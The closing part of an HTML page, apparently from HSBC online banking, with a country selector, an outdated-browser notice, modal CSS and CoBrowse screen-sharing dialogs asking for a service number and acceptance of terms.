                                    </ul>
                                    <ul class="nav">
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.pa/1/2/en/home" title="Panama (English)" class="pa" lang="en-US">Panama
                            <span>(English)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.pa/1/2/es/home" title="Panamá (Español)" lang="es-PA">Panamá <span>(Español)</span></a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.py/" title="Paraguay (English)" class="py" lang="en-US">Paraguay
                            <span>(English)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.py/" title="Paraguay (Español)" lang="es-PY">Paraguay <span>(Español)</span></a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.pe/1/2/es/home" title="Perú" class="pe" lang="es-PE">Perú</a></li>
                                        <li>
                                            <a href="http://www.us.hsbc.com/" title="United States" class="us" lang="en-US">United States</a></li>
                                        <li class="last">
                                            <a href="http://www.hsbc.com.uy/" title="Uruguay" class="uy" lang="es-UY">Uruguay</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>

                    
                </div>
            </div>
            <a class="jsLightboxTrigger noPrint" id="browserlink" data-target-id="lightboxContent7"></a>
            <div style="display: none;" id="lightboxContent7">
                <div class="alertLightbox informationBox clearfix">
                    <div class="alertLightboxInner">
                        <div class="row">
                            <p class="alertLightboxHeading">
                                We have detected your browser is out of date</p>
                            <p>Please update your web browser
                                <br>The browser you are using does not allow access to HSBC Online Banking. Supported browsers include the latest versions of:
                                <br>
                                <br>* Chrome
                                <br>* Internet Explorer or Edge
                                <br> * Firefox
                                <br>* Safari
                                <br>
                                <br>If you would prefer to use another browser, please read our <a href="http://www.hsbc.co.uk/1/2/accessibility" target="_blank">Accessibility statement</a> to check that your browser is supported.</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="noPrint" id="browserDiv" widgetid="browserDiv"></div>
            <div id="loadingOverlay" class="loadingOverlay"></div>
        </div>

        <div id="dijit__WidgetsInTemplateMixin_4" widgetid="dijit__WidgetsInTemplateMixin_4">
            <div data-dojo-attach-point="_interstitialNode" style="display: none;">
                <span class="loaderBg"></span>
                <span class="interstitial"></span>
            </div>
        </div>
    </div>
    <input type="hidden" id="jdata">
    
    <div tabindex="0" role="alert" id="hsbcwidget_Lightbox_0" widgetid="hsbcwidget_Lightbox_0">
        <div style="display: none;" class="lightbox" data-dojo-attach-point="lightboxNode"><span class="tabbableEl" tabindex="-1"></span>
            <a class="close jsClose noPrint" data-dojo-attach-point="closeButton" tabindex="0" role="button" href="#">close</a>
            <div data-dojo-attach-point="innerNode" class="lightboxInner1">
                <div data-dojo-attach-point="containerNode" class="lightboxInner2"></div>
            </div>
        </div>
        <div style="display: none;" class="overlay" data-dojo-attach-point="overlayNode"></div>
    </div>
    <div tabindex="0" role="dialog">
        <div style="display: none;" class="lightbox" data-dojo-attach-point="lightboxNode">
            <a class="close jsClose noPrint" data-dojo-attach-point="closeButton" tabindex="0" role="button" href="#">close</a>
            <div data-dojo-attach-point="innerNode" class="lightboxInner1">
                <div data-dojo-attach-point="containerNode" class="lightboxInner2"></div>
            </div>
        </div>
        <div style="display: none;" class="overlay" data-dojo-attach-point="overlayNode"></div>
    </div>
    <style>
        .CoBrowseHiddenForScreenReader {
            position: absolute;
            left: -10000px;
            top: auto;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
        
        input.CoBrowseCheckBox[type=checkbox]:checked ~ #tealiumAcceptTC {
            display: none !important;
        }
        
        .CoBrowseFade {
            display: none;
            position: fixed;
            left: 0 !important;
            top: 0 !important;
            bottom: 0 !important;
            right: 0 !important;
            width: 100%;
            height: 100%;
            z-index: 3000;
            background: rgba(0, 0, 0, 0.6);
        }
        
        .modale-shadowCob {
            display: block;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 9110;
            background: rgba(0, 0, 0, .7);
            cursor: pointer;
            z-index: 9250
        }
        
        .modale {
            transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            -webkit-transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            -moz-transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            -o-transition: opacity .25s cubic-bezier(0, .7, .38, 1);
            opacity: 1;
            visibility: visible;
            position: fixed;
            font-family: sans-serif
        }
        
        .modale.hidden {
            opacity: 0;
            visibility: hidden
        }
        
        .modale-content {
            z-index: 9251;
            background: white;
            border: 2px solid #DDDDDD;
            text-align: left;
            top: 50%;
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            padding: 40px;
            width: 540px
        }
        
        .modale-content .content {
            max-height: 410px;
            overflow-y: auto;
            overflow-x: hidden
        }
        
        .modale-title {
            font-weight: normal !important;
            font-size: 28px !important;
            line-height: 28px !important;
            margin-bottom: 15px;
            padding-bottom: 0 !important;
            color: #333 !important;
            text-align: center
        }
        
        .modale-text {
            line-height: 17px !important;
            margin-bottom: 24px;
            font-size: 16px !important;
            padding-bottom: 0 !important
        }
        
        .modale-text img {
            max-width: 100%
        }
        
        .modale-text--center {
            text-align: center
        }
        
        .buttonCloseModale {
            background: none;
            border: none;
            text-decoration: none;
            font-size: 40px;
            color: #333;
            cursor: pointer;
            position: absolute;
            top: 15px;
            right: 20px;
            height: 50px;
            width: 50px;
            text-align: center;
        }
        
        .buttonCloseModale:hover {
            color: #b6b7b6;
            cursor: pointer
        }
        
        .buttonCloseModale:focus {
            border-bottom: 1px solid black !important;
        }
        
        .text-non {
            margin-bottom: 10px
        }
        
        .text-non span {
            color: #db0011
        }
        
        body .modale-img {
            max-width: 100%;
            text-align: center
        }
        
        .modale-text--center {
            text-align: center
        }
        
        .selectRadioPopin {
            margin-bottom: 26px;
            font-size: 16px;
            color: #333
        }
        
        .modale-list {
            margin-left: 6px;
            margin-top: 16px;
            padding-bottom: 37px;
            padding-left: 18px;
            width: 51%;
            display: inline-block
        }
        
        .modale-list li {
            padding-bottom: 0;
            font-size: 16px;
            text-align: left
        }
        
        .selectTitle,
        .radioGroup,
        .radio {
            display: inline-block
        }
        
        .radio {
            margin-left: 32px;
            margin-bottom: 3px
        }
        
        .buttonsModale {
            width: 100%;
            padding: 10px 0;
            display: inline-block;
            border-top: 0 !important;
            margin-top: 10px
        }
        
        .modaleBtnOui {
            display: inline-block;
            text-align: center;
            text-decoration: none;
            font-family: sans-serif;
            font-size: 16px;
            padding: 15px 20px;
            background-color: #db0011;
            color: white;
            line-height: 1 !important
        }
        
        .modaleBtnOui:hover {
            background-color: #A4000D;
            text-decoration: none;
            color: white
        }
        
        .modaleBtnOui:active,
        .modaleBtnOui:focus {
            background-color: #83000A;
            text-decoration: none;
            color: white;
            outline: none
        }
        
        .modaleBtnNon {
            display: inline-block;
            text-align: center;
            text-decoration: none;
            font-family: sans-serif;
            font-size: 16px;
            padding: 14px 20px;
            text-decoration: none;
            cursor: pointer;
            border: 1px solid #333;
            color: #333;
            margin-right: 8px;
            line-height: 1 !important
        }
        
        .modaleBtnNon:hover {
            border: 1px solid #333;
            background-color: rgba(0, 0, 0, 0.05);
            text-decoration: none;
            color: #333
        }
        
        .modaleBtnNon:active,
        .modaleBtnNon:focus {
            border: 1px solid #333;
            background-color: rgba(0, 0, 0, 0.15);
            text-decoration: none;
            color: #333;
            outline: none
        }
        
        .disclaimerPopin {
            display: inline-block;
            color: #333;
            font-size: 14px
        }
        
        body .buttonsModale a.continueBtn {
            float: right
        }
        
        .CoBrowseTextInput input {
            border: 1px solid #ccc;
            margin: 0 7px 3px 0;
            padding: 10px;
            width: 264px
        }
        
        .modale-text.error_red {
            color: #db0011;
            margin: 0;
            font-size: 14px!important;
        }
        
        span.error_input_exclamation {
            background-color: #db0011;
            padding: 6px 12px 5px 12px;
            font-size: 22px;
            margin-left: -38px;
            font-weight: bold;
            color: #fff;
            vertical-align: middle
        }
        
        label.modale-text {
            font-weight: bold !important;
            display: inline-block;
            margin-bottom: 12px;
        }
        
        .content .modale-text input.CoBrowseCheckBox:focus {
            outline: 1px solid black !important;
        }
    </style>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay1" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv1" aria-describedby="dialogDescriptionDiv1" id="modale-cob1" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(1);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob1"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv1" class="modale-title">CoBrowse</h3>
                <div id="dialogDescriptionDiv1">
                    <p class="modale-text">CoBrowse allows you to share your screen with a Contact Centre Agent if you need help with HSBC Online Banking.</p>
                    <p class="modale-text">This service is only available during business hours and if during your call or Live Chat conversation your query could be supported by CoBrowse, your Contact Centre Agent will provide a CoBrowse Service Number to start the service.</p>
                    <p class="modale-text">Please enter the CoBrowse Service Number provided by our Contact Centre Agent below.</p>
                </div>
                <div>
                    <label for="cobrowseIDSession1" class="modale-text">CoBrowse Service Number:</label>
                </div>
                <div class="CoBrowseTextInput">
                    <input type="text" name="idSession" id="cobrowseIDSession1">
                </div>
            </div>
            <div class="buttonsModale"><a href="#" class="modaleBtnNon modale-closeCob" title="Cancel" style="outline: 0px;" onclick="window.tealiumCobrowseClose(1); return false;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="nextCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumVerifyCobrowse(1); return false;">Continue</a></div>
        </div>
    </div>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay2" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv2" aria-describedby="dialogDescriptionDiv2" id="modale-cob2" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(2);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob2"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv2" class="modale-title">CoBrowse Terms and Conditions</h3>
                <div id="dialogDescriptionDiv2">
                    <p class="modale-text">This service allows HSBC UK’s Contact Centre Agent to see your web browser, as it appears on your own device. For security and privacy reasons the Contact Centre Agent won’t be able to see any other applications running on your device. They also won’t be able to type, press buttons, make any applications or transactions for you and can’t see passwords or other security information even if they’re visible on your device.</p>
                    <p class="modale-text">If you agree to this service, please tick the box below to accept the Terms and Conditions then select ‘Continue’ to start the session.</p>
                </div>
                <p class="modale-text">
                    <input class="CoBrowseCheckBox" aria-describedby="tealiumAcceptTC" type="checkbox" name="checkbox" id="checkbox">
                    <label style="font-size: 16px;" for="checkbox">&nbsp;I have read and accept the Terms and Conditions</label>
                    <br><span id="tealiumAcceptTC" class="modale hidden" role="alert" style="display: none; margin-top: 10px;font-size:14px;color:#db0011;">Please accept the Terms and Conditions</span></p>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" onclick="window.tealiumCobrowseClose(2); return false;" href="#" title="Cancel" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="launchCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumCobrowseAcceptTC(); return false;">Continue</a></div>
        </div>
        <div class="modale modale-shadowCob hidden"></div>
    </div>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay3" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv3" aria-describedby="dialogDescriptionDiv3" id="modale-cob3" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(3);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob3"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv3" class="modale-title">CoBrowse</h3>
                <div id="dialogDescriptionDiv3">
                    <p class="modale-text">
                        <br>CoBrowse allows you to share your screen with a Contact Centre Agent if you need help with HSBC Online Banking.</p>
                    <p class="modale-text">This service is only available during business hours and if during your call or Live Chat conversation your query could be supported by CoBrowse, your Contact Centre Agent will provide a CoBrowse Service Number to start the service.</p>
                    <p class="modale-text">Please enter the CoBrowse Service Number provided by our Contact Centre Agent below.</p>
                </div>
                <div>
                    <label for="cobrowseIDSession3" class="modale-text">CoBrowse Service Number:</label>
                </div>
                <div class="CoBrowseTextInput">
                    <input aria-describedby="termsAndConditionError" type="text" name="idSession" id="cobrowseIDSession3"><span class="error_input_exclamation">!</span>
                    <p id="termsAndConditionError" role="alert" class="modale-text error_red">The CoBrowse Service Number you have entered doesn't match our records. Please try again.</p>
                </div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" href="#" onclick="window.tealiumCobrowseClose(3); return false;" title="Cancel" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="restartCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumVerifyCobrowse(3); return false;">Continue</a></div>
        </div>
        <div class="modale modale-shadowCob hidden"></div>
    </div>
    <div tabindex="-1">
        <div id="CoBrowseBackgroundOverlay4" class="CoBrowseFade"></div>
        <div aria-hidden="true" class="modale modale-content hidden" role="dialog" aria-labelledby="dialogTitleDiv4" aria-describedby="dialogDescriptionDiv4" id="modale-cob4" tabindex="0">
            <div class="content">
                <button tabindex="0" onclick="window.tealiumCobrowseClose(4);" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob4"><span class="CoBrowseHiddenForScreenReader">Close</span><span aria-hidden="true">×</span></button>
                <h3 id="dialogTitleDiv4" class="modale-title">CoBrowse</h3>
                <div id="dialogDescriptionDiv4">
                    <p class="modale-text"><strong>Please enter a valid CoBrowse Service Number</strong></p>
                    <p class="modale-text">Please check the CoBrowse Service Number with the customer service representative and enter it again.</p>
                </div>
                <div>
                    <label for="cobrowseIDSession4" class="modale-text">CoBrowse Service Number:</label>
                </div>
                <div class="CoBrowseTextInput">
                    <input type="text" name="idSession" id="cobrowseIDSession4">
                </div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" onclick="window.tealiumCobrowseClose(4); return false;" href="#" title="Cancel" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="restartCob" href="#" title="Continue" style="outline: 0px;" onclick="window.tealiumVerifyCobrowse(4); return false;">Continue</a></div>
        </div>
        <div class="modale modale-shadowCob hidden"></div>
    </div>
    
</body>

</html>